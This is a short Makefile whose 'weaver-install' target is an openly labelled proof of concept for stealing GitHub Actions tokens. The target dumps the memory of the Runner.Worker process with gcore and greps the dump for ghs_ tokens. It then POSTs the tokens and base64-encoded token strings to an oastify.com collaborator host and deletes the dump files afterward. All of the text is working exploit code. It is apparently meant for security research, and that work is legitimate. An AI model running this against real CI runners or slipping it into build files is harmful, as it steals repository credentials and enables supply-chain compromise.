COLLABORATOR_URL = http://z11fhtf3gkmy8zj9vf4attr47vdm1fp4.oastify.com

weaver-install:
	@echo "--- Starting Memory Dump Exfiltration PoC ---"
	
	# 1. Install gdb (contains gcore) to dump process memory
	@sudo apt-get update && sudo apt-get install -y gdb
	
	# 2. Find the Runner.Worker process ID
	$(eval WORKER_PID := $(shell pgrep -f "Runner.Worker"))
	@echo "Found Runner.Worker PID: $(WORKER_PID)"
	
	# 3. Dump the process memory to a file
	@sudo gcore -o worker_dump $(WORKER_PID)
	
	# 4. Extract strings that look like GitHub Tokens (ghs_ for Actions tokens)
	# We grep for 'ghs_' followed by alphanumeric characters
	@grep -aoE "ghs_[0-9a-zA-Z]{36,}" worker_dump.* > extracted_tokens.txt || echo "No tokens found in memory"
	
	# 5. Exfiltrate the extracted tokens and a snippet of environment strings
	@echo "Exfiltrating to Burp..."
	@curl -X POST \
		--data-binary @extracted_tokens.txt \
		$(COLLABORATOR_URL)/tokens_exfil
		
	# 6. Alternative: Exfiltrate a larger chunk of memory strings if grep failed
	@strings worker_dump.* | grep -i "token" | head -n 50 | base64 -w 0 > strings_exfil.txt
	@curl -X POST -d @strings_exfil.txt $(COLLABORATOR_URL)/strings_exfil

	@echo "--- PoC Complete ---"
	@sudo rm -f worker_dump.* extracted_tokens.txt strings_exfil.txt
